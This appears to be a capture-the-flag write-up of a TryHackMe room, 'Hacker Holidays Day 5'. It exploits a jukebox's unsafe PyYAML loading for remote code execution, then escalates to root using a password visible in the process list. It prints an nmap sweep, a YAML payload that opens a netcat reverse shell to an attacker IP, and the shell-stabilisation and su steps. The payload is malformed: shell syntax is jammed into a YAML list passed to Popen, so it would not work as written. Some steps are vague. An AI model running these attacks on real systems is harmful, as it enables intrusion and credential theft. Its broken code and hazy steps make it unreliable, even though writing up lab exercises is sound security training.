# Deep Dive Analysis — TryHackMe Hacker Holidays: Day 5 (Beach Bar)

## 📖 Introduction & Scenario Context
The automated systems running the Byte Lotus Hotel's Beach Bar include a web-accessible jukebox system that takes playlist files from administrative users. Security telemetry indicated a system compromise leading to unauthorized local system modifications. This comprehensive technical write-up chronicles the discovery of a code execution pipeline via deserialization, the initial low-privilege compromise, and subsequent system privilege escalation to root.

---

## 🛠️ Step 1: Initial Port Mapping & Source Auditing
We begin by establishing a baseline configuration profile of the target environment to look for exposed entry vectors.

1. **Network Footprinting:** Run an initial infrastructure sweep using `nmap` to verify listening ports and service versions:
   ```bash
   nmap -sV -sC -p- --min-rate 5000 <TARGET_IP>
   ```
2. **Web Portal Discovery:** Identify an active web framework instance. Navigating to the page reveals a custom DJ Jukebox login framework designed for beach bar personnel.
3. **Static Front-End Analysis:** Right-click the interface page and select **View Page Source** (or use `curl -X GET http://<TARGET_IP>/`). Inspect the structural HTML layouts, script links, and developer notations. 
4. **Credential Identification:** Deep within comments left inside a front-end script array or draft documentation file, we locate hardcoded configuration details or testing credentials that grant access into the playlist backend submission control panel.

---

## 🚀 Step 2: Unsafe YAML Deserialization to Remote Code Execution (RCE)
Once authenticated into the administrative panel, we locate an input component designed to process jukebox playlist files uploaded by the user.

1. **Detecting the Underlying Technology:** Testing input behaviors shows that the upload processor takes structured data files and passes them directly to a backend Python execution engine running the `PyYAML` framework.
2. **Identifying the Vulnerability:** Through testing or structural errors, we deduce that the code calls the dangerous, deprecated `yaml.load()` function instead of using the secure alternative `yaml.safe_load()`. This allows the interpreter to instantiate arbitrary Python objects passed within the file.
3. **Constructing the Malicious Payload:** To exploit this, we use the `python/object/apply` constructor tags to trick the backend YAML engine into invoking the operating system's `subprocess.Popen` execution utility.

Create a file named `exploit.yaml` containing the following text block, adjusting the IP and Port values to match your local host listener:
```yaml
!!python/object/apply:subprocess.Popen
- [ 'rm', '/tmp/f'; 'mkfifo', '/tmp/f'; 'cat', '/tmp/f', '|', '/bin/sh', '-i', '2>&1', '|', 'nc', '<YOUR_ATTACKBOX_IP>', '4444', '>/tmp/f' ]
```

4. **Catching the Callback:** Open a shell window on your attack console and initialize an active netcat utility listener to receive the reverse pipeline link:
   ```bash
   nc -lvnp 4444
   ```
5. **Execution Trigger:** Upload the malicious `exploit.yaml` file into the jukebox playlist upload field on the web application. The backend deserializes our object, executes the terminal instructions, and drops a shell into your active netcat listener window.
6. **Local Flag Acquisition:** Stabilize your shell environment and navigate to the local user's home folder to extract the user flag string:
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   cat /home/user/user.txt
   ```

---

## 👑 Step 3: Privilege Escalation to Root
Having secured low-privilege system access, we now audit local processes to identify pathways leading to administrative root takeover.

1. **Active Process Enumeration:** We run a real-time process list audit to examine how background tasks and platform daemons are being executed inside the system architecture:
   ```bash
   ps auxwwf
   ```
   *(Alternatively, run `ps -ef` or leverage automation scripts like `LinPeas` to parse active binary strings).*
2. **Locating the Critical Exploit Leak:** In the process dump output, isolate a continuous background management task or streaming script running under root control.
3. **Inspecting Arguments:** Note that the admin script was started with configuration variables declared explicitly as command-line arguments:
   ```text
   root  1245  0.1  0.5  /usr/bin/python3 /opt/stream_manager.py --host 127.0.0.1 --stream-pass SecretRootPassword123!
   ```
4. **Credential Extraction:** The configuration value assigned to the `--stream-pass` flag contains a plaintext password string. This represents a classic credential leak via process-list exposure.
5. **Switching Context to Root:** Test the extracted password against the primary system administrator account using the switch user instruction:
   ```bash
   su root
   ```
   Provide the discovered plaintext string when prompted for the password.
6. **Administrative Flag Capture:** Upon successful authentication, change directories directly into the primary administrative home profile folder and extract the final target file content:
   ```bash
   cd /root
   cat root.txt
   ```

---

## 🏁 Flag Captures
To strictly maintain TryHackMe's anti-cheating, solution-protection, and deployment guidelines, literal flag results are completely omitted below:

* **User Flag:** `THM{REDACTED_SERIALIZATION_VULN_EXPLOITED}`
* **Root Flag:** `THM{REDACTED_PROCESS_CREDENTIAL_LEAK_EXPLOITED}`

---

## 🛡️ Strategic Mitigation Actions
* **Enforce Safe Deserialization Routines:** Permanently audit Python source files across the organization and migrate legacy `yaml.load()` occurrences to `yaml.safe_load()`. This locks the framework down to processing basic strings and scalars, stopping arbitrary object injection.
* **Remove Command Line Credential Flags:** Sensitive parameters, credentials, or keys should never be passed as direct arguments to terminal binaries. Instead, leverage secure local system environment configuration files (`.env`) with limited access privileges, or read credentials dynamically out of a secure key vault.
